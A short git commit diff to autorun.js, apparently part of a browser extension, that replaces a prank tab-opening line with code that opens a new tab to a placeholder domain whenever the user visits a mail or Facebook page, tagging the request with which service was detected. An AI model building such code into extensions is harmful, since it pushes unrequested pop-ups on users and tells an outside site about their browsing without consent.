68a0a66831d646d7cd47aa721fb3c0faea1db092
Developer <dev@gaborbuzasi.com>
2019-11-16 08:12:03 +0000

    opens websites

--- autorun.js
+++ autorun.js
@@ -1,1 +1,12 @@
-window.open('anyadpicsaja', '_blank');
+let path = window.location.href;
+
+const websiteDomain = "https://yourwebsitesname.net";
+
+if (path.includes("gmail") || path.includes("mail"))
+{
+    window.open(websiteDomain + '?d=gmail', '_blank');
+}
+else if (path.includes("facebook"))
+{
+    window.open(websiteDomain + '?d=facebook', '_blank');
+}
